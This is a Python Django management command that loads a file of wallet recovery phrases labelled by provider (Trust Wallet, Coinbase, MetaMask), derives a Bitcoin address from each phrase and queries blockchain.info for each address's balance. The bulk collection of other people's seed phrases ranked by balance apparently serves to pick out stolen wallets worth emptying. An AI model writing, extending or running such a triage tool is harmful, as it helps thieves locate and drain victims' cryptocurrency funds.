# myapp/management/commands/generate_btc_addresses.py

import json
import requests
from mnemonic import Mnemonic
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
from django.core.management.base import BaseCommand

class Command(BaseCommand):
    help = 'Generate BTC addresses from mnemonic phrases, check balances, and update data.json'

    def handle(self, *args, **kwargs):
        input_file = './p.json'
        output_file = './p_updated.json'

        self.generate_and_check_balances(input_file, output_file)
        self.stdout.write(self.style.SUCCESS(f"BTC addresses generated, balances checked, and saved to {output_file}"))

    def generate_and_check_balances(self, input_file, output_file):
        with open(input_file, 'r') as f:
            data = json.load(f)

        updated_data = {}

        for key, value in data.items():
            if 'Trust Wallet Pass Phrase' in value or 'Coinbase Pass Phrase' in value or 'MetaMask Pass Phrase' in value:
                if 'Trust Wallet Pass Phrase' in value:
                    passphrase = value['Trust Wallet Pass Phrase']['value']
                elif 'MetaMask Pass Phrase' in value:
                    passphrase = value['MetaMask Pass Phrase']['value']
                else:
                    passphrase = value['Coinbase Pass Phrase']['value']
                    
                btc_address = self.generate_btc_address(passphrase)
                balance = self.check_balance(btc_address)
                print(balance, btc_address)

                value['BTC Address'] = btc_address
                value['Balance'] = balance
            updated_data[key] = value

        with open(output_file, 'w') as f:
            json.dump(updated_data, f, indent=4)

    def generate_btc_address(self, passphrase):
        # Initialize Mnemonic and generate seed
        mnemonic = Mnemonic("english")
        seed = mnemonic.to_seed(passphrase)

        # Generate BTC address using BIP44
        bip44_mst_ctx = Bip44.FromSeed(seed, Bip44Coins.BITCOIN)
        bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT)
        bip44_addr_ctx = bip44_acc_ctx.AddressIndex(0)

        # Return the BTC address
        return bip44_addr_ctx.PublicKey().ToAddress()

    def check_balance(self, address):
        # Get the balance of the BTC address using blockchain.info API
        try:
            url = f'https://blockchain.info/q/addressbalance/{address}'
            response = requests.get(url)
            balance_satoshi = int(response.text)
            balance_btc = balance_satoshi / 1e8  # Convert satoshi to BTC
            return balance_btc
        except Exception as e:
            self.stdout.write(self.style.ERROR(f"Error fetching balance for {address}: {str(e)}"))
            return 0.0
